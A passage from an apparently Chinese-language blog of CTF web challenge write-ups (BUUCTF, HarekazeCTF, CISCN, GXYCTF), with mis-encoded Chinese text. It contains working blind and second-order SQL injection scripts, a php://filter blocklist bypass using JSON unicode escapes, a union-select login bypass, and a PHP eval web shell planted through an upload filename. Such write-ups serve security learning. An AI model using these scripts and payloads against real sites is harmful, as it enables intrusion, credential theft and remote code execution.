r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">    length = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">"[+]é•¿åº¦ï¼š"</span> + str(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">"0'|conv(hex(substr(("</span> + sql + <span class="string">"),"</span> + str(i) + <span class="string">",5)),16,10)|'0"</span></span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;) <span class="comment"># å°†è¯­å¥æ³¨å…¥</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># æŸ¥è¯¢ä¸Šæ¬¡IPæ—¶è§¦å‘äºŒæ¬¡æ³¨å…¥</span></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">'glzjin'</span>&#125;)    <span class="comment"># å†æ¬¡æŸ¥è¯¢å¾—åˆ°ç»“æœ</span></span><br><span class="line">        start_pos = r.text.find(<span class="string">"Last Ip: "</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">" --&gt;"</span>, start_pos)</span><br><span class="line">        result = int(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        return_result += bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"[+]ä½ç½® "</span> + str(i) + <span class="string">" è¯·æ±‚äº”ä½æˆåŠŸ:"</span> + bytes.fromhex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“è¡¨</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“è¡¨</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–è¡¨ä¸­å†…å®¹</span></span><br><span class="line">print(<span class="string">"[+]è·å–æˆåŠŸï¼š"</span> + execute_sql(<span class="string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span>))</span><br></pre></td></tr></table></figure>

<h1 id="Black-Watch-å…¥ç¾¤é¢˜-Web"><a href="#Black-Watch-å…¥ç¾¤é¢˜-Web" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]Web"></a>[Black Watch å…¥ç¾¤é¢˜]Web</h1><p>è€ƒå¯Ÿå¼‚æˆ–æ³¨å…¥</p>
<h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®çœ‹åˆ°å¦‚ä¸‹çš„ç•Œé¢ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web95.png" alt=""><br>ç‚¹å‡»çƒ­ç‚¹åˆ—è¡¨é‡Œé¢çš„å­—çš„æ—¶å€™ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼ŒåŒæ—¶è¿˜æœ‰ç™»å½•é¡µé¢ï¼Œèµ·åˆçŒœæµ‹æ˜¯æ³¨å…¥æ˜¯åœ¨ç™»å½•é¡µé¢ï¼Œé‚£é‡Œé€šè¿‡JSONå¯¹usernameå’Œpasswordè¿›è¡Œä¼ å‚ï¼Œå‰é¢åšäº†JSONä¸­è¿›è¡Œæ³¨å…¥çš„é¢˜ç›®ï¼Œä½†æ˜¯è¿™é“é¢˜çš„æ³¨å…¥ç‚¹å…¶å®æ˜¯åœ¨è·³è½¬çš„é‚£ä¸ªé¡µé¢ï¼ŒæŠ“åŒ…å¯ä»¥å‘ç°ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web94.png" alt=""><br>è¿™ä¸ªé¡µé¢æ˜¯åˆ©ç”¨<code>GET</code>æ–¹å¼ç›´æ¥è¿›è¡Œ<code>id</code>ä¼ å‚çš„ï¼Œå­˜åœ¨æ³¨å…¥çš„å¯èƒ½æ€§æ›´å¤§ï¼Œåæ¥å°è¯æ˜¯å¼‚æˆ–æ³¨å…¥ï¼Œç”¨è„šæœ¬è·‘ã€‚</p>
<h3 id="è§£é¢˜è„šæœ¬"><a href="#è§£é¢˜è„šæœ¬" class="headerlink" title="è§£é¢˜è„šæœ¬"></a>è§£é¢˜è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># if correct , return empty, else return something</span></span><br><span class="line">url = <span class="string">"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># [+] --&gt;admin,contents&lt;--</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,title,content,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,username,password,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) // <span class="number">2</span></span><br><span class="line">        payload_tmp = payload.format(index, m_bound)</span><br><span class="line">        url_tmp = url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        res = requests.get(url_tmp).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> res:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="comment"># sys.stdout.write("[+] --&gt;%s&lt;--\r" % (result))</span></span><br><span class="line">    <span class="comment"># sys.stdout.flush()</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>è·‘å‡ºæ¥ä¸¤ç»„ç”¨æˆ·åå’Œå¯†ç ï¼Œç»„åˆå°è¯•å°±è¡Œäº†ã€‚</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>è€ƒå¯Ÿ<code>é€šè¿‡JSONè½¬ä¹‰å­—ç¬¦ä¸²ç»•è¿‡</code></p>
<h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œåœ¨ç¬¬ä¸‰ä¸ªæŒ‰é’®çœ‹åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å®¡è®¡ä»£ç å‘ç°ï¼Œ<code>is_valid()</code>å‡½æ•°ä¸­é€šè¿‡é»‘åå•è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ä¸²ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å¯èƒ½ç”¨åˆ°çš„åè®®ã€‚<br>ç„¶åæˆ‘ä»¬å‘ç°<code>body</code>çš„å€¼æ˜¯é€šè¿‡<code>file_get_contents(&#39;php://input&#39;)</code>ä¼ è¿‡æ¥çš„ï¼ŒæŸ¥äº†ä¸€ä¸‹æ¶¨çŸ¥è¯†äº†ï¼š</p>
<blockquote>
<p>å¦‚æœPOSTçš„åŸå§‹æ•°æ®æ˜¯ä¸€ç»´æ•°ç»„æˆ–<code>&amp;</code>æ‹¼æ¥çš„æ ‡å‡†æ ¼å¼çš„é”®å€¼å¯¹å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨<code>$_POST</code>æ¥è·å–ã€‚å¦‚æœå‘é€jsonå­—ç¬¦ä¸²ï¼Œä¸€èˆ¬è¦é€šè¿‡<code>file_get_contents</code>è·å–ã€‚</p>
</blockquote>
<p>å› ä¸ºè¿™é‡Œæ˜¯é€šè¿‡JSONç¼–ç ä¼ è¾“çš„ï¼Œå› æ­¤ç”¨è¿™ç§æ–¹å¼ï¼Œç„¶åå¯¹<code>body</code>çš„å€¼è¿›è¡Œè§£ç å¹¶èµ‹å€¼ç»™<code>json</code>ã€‚ç„¶åå†åˆ©ç”¨è‡ªå®šä¹‰çš„<code>is_valid()</code>å‡½æ•°è¿›è¡Œåˆ¤æ–­ï¼Œå¹¶ä¸”å¯ä»¥çœ‹å‡º<code>json</code>ä¸­æœ‰<code>page</code>è¿™ä¸ªé”®å€¼å¯¹ã€‚<br>æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡JSONä¼ è¾“æ•°æ®æ¥è¯»å–åˆ°flagï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°phpçš„ä¼ªåè®®äº†ï¼Œä½†æ˜¯<code>php</code>å·²ç»è¢«banäº†ï¼Œä½†æ˜¯çš„ä½†æ˜¯ï¼š<code>\uXXXX</code>å¯ä»¥åœ¨<code>JSON</code>ä¸­è½¬ä¹‰å­—ç¬¦ï¼Œä¾‹å¦‚<code>A=\u0041</code>ï¼Œå› æ­¤åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&#123;"page":"<span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070://filter/convert.base64-encode/resource=/<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067"&#125;</span><br><span class="line">/* <span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070è¡¨ç¤ºphpï¼›<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067è¡¨ç¤ºflag */</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸæ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web97.png" alt=""></p>
<h2 id="CISCN-2019-Easyweb"><a href="#CISCN-2019-Easyweb" class="headerlink" title="[CISCN 2019]Easyweb"></a>[CISCN 2019]Easyweb</h2><p>æ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼Œæ–‡ä»¶ä¸Šä¼ æ—¶çŸ­æ ‡ç­¾ç»•è¿‡phpè¿‡æ»¤</p>
<h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œè®¿é—®<code>robots.txt</code>å‘ç°æºç å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½åˆ°<code>iamge.php.bak</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;ï»¿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>å®¡è®¡ä»£ç å‘ç°åº”è¯¥éœ€è¦è¿›è¡Œsqlæ³¨å…¥ï¼Œä½†æ˜¯å•å¼•å·è¢«è¿‡æ»¤æ‰äº†ã€‚ç”±äºè½¬ä¹‰å‡½æ•°<code>addslashes</code>çš„å­˜åœ¨ï¼ŒåŒæ—¶<code>\0</code>ã€<code>&#39;</code>è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥<code>\0</code>ï¼Œç»è¿‡<code>addslashes</code>å‡½æ•°ä¼šå…ˆå˜æˆ<code>\\0</code>,ç„¶åç»è¿‡<code>str_replace</code>å‡½æ•°ï¼Œä¼šå˜æˆ<code>\</code>ï¼Œè¿™æ ·ï¼Œå°±æŠŠ<code>id</code>åé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚æ‰€ä»¥å¯ä»¥æ„é€ ç±»ä¼¼ä¸‹é¢çš„payloadï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://a<span class="number">215</span>b<span class="number">254</span>-<span class="keyword">c</span><span class="number">237</span><span class="number">-4670</span>-a<span class="number">4</span><span class="keyword">cc</span><span class="number">-9</span>dfea<span class="number">3</span>d<span class="number">34</span>f<span class="number">26</span>.node<span class="number">3</span>.buuoj.cn/image.php?id=\<span class="number">0</span>'&amp;path= <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure>
<p>åå°æ‰§è¡Œçš„sqlè¯­å¥ä¾¿æ˜¯ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> images <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'\'</span> <span class="keyword">or</span> <span class="keyword">path</span>=<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>ä»è€Œç»•è¿‡äº†è¿‡æ»¤ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸€ç‚¹å†™è„šæœ¬æ³¨å…¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    h = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(l-h)&gt;<span class="number">1</span>:</span><br><span class="line">        i=int((l+h)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or ascii(substr((select password from users),"</span>+str(j)+<span class="string">",1))&gt;"</span>+str(i)+<span class="string">"%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code==<span class="string">'429'</span>:</span><br><span class="line">            print(<span class="string">'to fast'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'Content-Length'</span> <span class="keyword">in</span> r.headers:</span><br><span class="line">            l = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = i</span><br><span class="line">    name += chr(h)</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°å¯†ç ä¹‹åï¼Œç”¨adminèº«ä»½ç™»å½•ï¼Œå‘ç°éœ€è¦è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”ä¼šå°†æ–‡ä»¶åå’Œç”¨æˆ·åå†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ç”±äºæ—¥å¿—æ–‡ä»¶çš„æ ¼å¼æ˜¯phpçš„ï¼Œå› æ­¤è€ƒè™‘å†™å…¥shellã€‚<br>è¿™é‡Œç”±äºç”¨æˆ·åå·²ç»æ˜¯<code>admin</code>ä¸å¯å˜çš„ï¼Œé‚£å°±éœ€è¦åœ¨æ–‡ä»¶åä¸Šåšæ‰‹è„šï¼Œä½†æ˜¯æ–‡ä»¶åè¿›è¡Œäº†<code>php/i</code>çš„è¿‡æ»¤ï¼Œæ­¤å¤„åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">filename="<span class="php"><span class="meta">&lt;?</span>=$_GET[<span class="string">'cmd'</span>]; <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span>"</span><br></pre></td></tr></table></figure>
<p>å…³äºçŸ­æ ‡ç­¾æ‰©å±•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>çŸ­æ ‡ç­¾<code>&lt;? ?&gt;</code>éœ€è¦<code>php.ini</code>å¼€å¯<code>short_open_tag = On</code>ï¼Œä½†<code>&lt;?= ?&gt;</code>ä¸å—è¯¥æ¡æ§åˆ¶ã€‚</p>
</blockquote>
<p>ä¸Šä¼ å°é©¬ä¹‹åï¼Œå¾—åˆ°å¦‚ä¸‹çš„æ–‡ä»¶åï¼Œç„¶åèšå‰‘è¿æ¥æ‹¿åˆ°shellï¼Œå³å¯æ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web98.png" alt=""></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>è€ƒå¯Ÿç‚¹ï¼šå¤šæ¬¡ç¼–ç (base32ã€base64)ï¼Œ<code>union select</code>æ³¨å…¥ç»“åˆ<code>md5</code>é€šè¿‡åå°åˆ¤æ–­ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>éšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç åï¼ŒæŸ¥çœ‹æºç å‘ç°ä¸€ä¸²base32ï¼š</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">MMZF<span class="name">M422</span>K<span class="number">5</span>HDASKD<span class="symbol">N5</span>TVU<span class="number">3</span>SKOZRFGQRRMMZF<span class="name">M6</span>KJJBS<span class="name">G6</span>WSYJJWESSCWPJ<span class="symbol">NFQSTVLFLTC3</span>CJIQYGOSTZKJ<span class="number">2</span><span class="attr">VSVZRNRFHOPJ5</span></span><br></pre></td></tr></table></figure>
<p>è§£ç ä¹‹åï¼š</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">c<span class="number">2</span><span class="attr">VsZWN0</span>ICogZ<span class="symbol">nJvbSB1</span>c<span class="number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="number">1</span>lID<span class="number">0</span>gJyRuYW<span class="number">1</span>lJw==</span><br></pre></td></tr></table></figure>
<p>å†é€šè¿‡base64è§£ç ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤å¯è§ï¼Œåœ¨<code>username</code>å¤„å­˜åœ¨æ³¨å…¥ç‚¹ã€‚<br>ç”¨å¸¸è§„çš„æ³¨å…¥æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>æç¤º<code>wrong user</code>ï¼Œæ¥ç€æˆ‘ä»¬æŠŠ<code>admin</code>åˆ†åˆ«æ›¿æ¢1ã€2ã€3çš„ä½ç½®ï¼Œå‘ç°æ›¿æ¢2çš„æ—¶å€™æŠ¥é”™å˜æˆ<code>wrong pass</code>è¯´æ˜äº†<code>username</code>å°±æ˜¯åœ¨ç¬¬äºŒä¸ªä½ç½®ï¼ŒåŸé¢˜æç¤ºäº†<code>md5</code>ï¼Œè‚¯å®šæ˜¯å¯¹å¯†ç è¿›è¡Œäº†å“ˆå¸Œï¼Œé‚£ä¹ˆå¯ä»¥æ¨æ–­ï¼Œ3å¤„åº”è¯¥æ›¿æ¢ä¸ºå¯†ç çš„å“ˆå¸Œå€¼ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ä¸Šé¢çš„è¯­å¥ï¼Œå†æŠŠéšä¾¿è¾“å…¥çš„å¯†ç çš„md5å€¼æ›¿æ¢åˆ°3çš„ä½ç½®ï¼Œåœ¨åå¤´å°±èƒ½æ„æˆæ»¡è¶³åç«¯åˆ¤æ–­çš„æŸ¥è¯¢è¯­å¥äº†ã€‚</p>
<h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>éšä¾¿æ‰¾ä¸ªå¯†ç ä»¥åŠå¯†ç çš„md5å€¼ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>123456/e10adc3949ba59abbe56e057f20f883e</code>ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="symbol">'admin</span><span class="string">','</span>e10adc3949ba59abbe56e057f20f883e'%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>usernameå¤„è¾“å…¥payloadï¼Œpasswordè¾“å…¥123456å³å¯æ‹¿åˆ°flagã€‚</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>åˆ©ç”¨å¼‚æˆ–æ„é€ webshellï¼Œå‚è€ƒä¸Šä¸€ç¯‡åšå®¢çš„çŸ¥è¯†ç‚¹ã€‚<br>fuzzè„šæœ¬</p>
